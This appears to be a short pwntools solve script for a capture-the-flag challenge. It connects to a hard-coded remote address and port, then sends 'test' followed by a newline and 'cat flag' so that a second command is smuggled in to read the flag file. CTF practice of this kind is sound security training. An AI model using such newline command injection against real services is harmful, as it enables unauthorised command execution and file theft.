from pwn import *
context(arch="amd64", log_level="debug")
p=remote('43.249.195.138',21284)

p.sendline(b'test\ncat flag\n')
p.interactive()